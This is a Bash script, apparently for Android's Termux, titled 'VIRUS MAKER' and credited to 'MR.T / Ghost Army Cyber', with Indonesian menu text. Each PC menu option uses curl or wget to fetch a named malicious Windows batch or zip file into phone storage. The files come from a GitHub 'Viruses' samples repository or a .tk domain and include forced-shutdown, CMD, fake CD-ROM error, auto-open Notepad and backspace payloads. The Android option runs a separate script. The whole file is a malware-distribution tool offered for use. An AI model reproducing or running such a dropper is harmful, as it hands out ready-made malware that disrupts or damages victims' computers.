#!/bin/bash
#version 1.0

clear
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo " "
echo " "
echo " "
echo " "
figlet -f slant "VIRUS MAKER" | lolcat
echo " "
echo "                 GHOST ARMY CYBER             " | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By MR.T     ]=====>" | lolcat
echo "    <=====[       VIRUS MAKER        ]=====>" | lolcat
echo "    <=====[   github.com/BURIQ2019   ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
###################################################
figlet -f slant "PILIH VIRUS" | lolcat
###################################################
echo "=======================================================" | lolcat
echo " 1. ANDROID" | lolcat
echo " 2. PC " | lolcat
echo " 3. EXIT" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " asw

if [ $asw = "3" ] || [ $asw = "03" ]
then
sleep 1
echo "MAKASIH SUDAH GUNAIN TOOLS INI"
echo "SAYA MR.T"
echo "BYE BYE"
exit
fi

if [ $asw = "1" ] || [ $asw = "01" ]
then
sh SFHS.sh
fi



if [ $asw = "2" ] || [ $asw = "02" ]
then
clear
figlet -f slant "VIRUS PC" | lolcat
echo "=======================================================" | lolcat
echo " 01. CDM " | lolcat
echo " 02. KUIS " | lolcat
echo " 03. ERORS CD ROOM " | lolcat
echo " 04. SHUTDOWN V1" | lolcat
echo " 05. SHUTDOWN V2 " | lolcat
echo " 06. AUTO OPEN NETEPAD"  | lolcat 
echo " 07. BACKSPACE" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " pol
fi

if [ $pol = "1" ] || [ $pol = "01" ]
then
cd /storage/emulated/0
curl -o cmd.bat https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/cmd.bat  
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "2" ] || [ $pol = "02" ]
then
cd /storage/emulated/0
curl -o kuis.bat https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/kuis.bat 
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "3" ] || [ $pol = "03" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/eror-cd-room.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "4" ] || [ $pol = "04" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/ShutDown1.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "5" ] || [ $pol = "05" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/ShutDown2.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "6" ] || [ $pol = "06" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Notepad.bat
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi

if [ $pol = "7" ] || [ $pol = "07" ]
then
cd /storage/emulated/0
wget http://gogr4m.tk/Virus/Backspace.zip
echo " [!] Download Success........" | lolcat
echo " LIHAT DI PENYIMPAN...." | lolcat
fi


